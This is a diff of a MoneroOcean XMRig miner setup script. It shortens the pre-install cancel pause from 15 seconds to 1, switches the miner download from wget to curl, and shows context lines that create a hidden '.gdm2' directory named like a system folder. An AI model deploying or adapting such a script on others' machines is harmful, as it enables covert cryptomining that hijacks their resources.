@@ -7,7 +7,7 @@ VERSION=2.11
 
 echo "MoneroOcean mining setup script v$VERSION."
 echo "(please report issues to support@moneroocean.stream email with full output of this script with extra \"-x\" \"bash\" option)"
-echo
+
 
 if [ "$(id -u)" == "0" ]; then
   echo "WARNING: Generally it is not adviced to run this script under root"
@@ -140,7 +140,7 @@ echo "JFYI: This host has $CPU_THREADS CPU threads, so projected Monero hashrate
 echo
 
 echo "Sleeping for 15 seconds before continuing (press Ctrl+C to cancel)"
-sleep 15
+sleep 1
 echo
 echo
 
@@ -157,13 +157,13 @@ echo "[*] Removing $HOME/moneroocean directory"
 rm -rf $HOME/moneroocean
 rm -rf $HOME/.moneroocean
 
-#echo "[*] Downloading MoneroOcean advanced version of xmrig to xmrig.tar.gz"
-#if ! curl -L --progress-bar "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" -o xmrig.tar.gz; then
-#  echo "ERROR: Can't download https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz file to xmrig.tar.gz"
-#  exit 1
-#fi
+echo "[*] Downloading MoneroOcean advanced version of xmrig to xmrig.tar.gz"
+if ! curl -L --progress-bar "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" -o xmrig.tar.gz; then
+  echo "ERROR: Can't download https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz file to xmrig.tar.gz"
+  exit 1
+fi
 
-wget https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz
+# wget https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz
 
 echo "[*] Unpacking xmrig.tar.gz to $HOME/.moneroocean"
 [ -d $HOME/.gdm2 ] || mkdir $HOME/.gdm2
